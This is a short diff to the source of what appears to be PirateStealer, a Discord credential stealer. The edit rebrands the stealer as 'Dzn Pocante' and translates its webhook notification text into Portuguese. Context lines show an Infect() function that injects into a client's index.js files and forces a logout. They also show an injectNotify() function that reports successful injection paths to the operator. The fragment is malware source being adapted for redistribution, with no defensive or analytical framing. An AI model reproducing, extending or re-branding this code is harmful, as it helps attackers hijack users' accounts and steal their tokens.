@@ -61,7 +61,7 @@ function Infect() {
                     }
                 }
                 if ( config.logout !== "false" ) {
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "Dzn Pocante")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -155,7 +155,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: ":syringe: Injetado no caminho",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -166,14 +166,14 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
+            "title": ":detective: Injetado com Sucesso",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "Dzn Pocante"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Dzn Pocante"
             }
           }
         ]
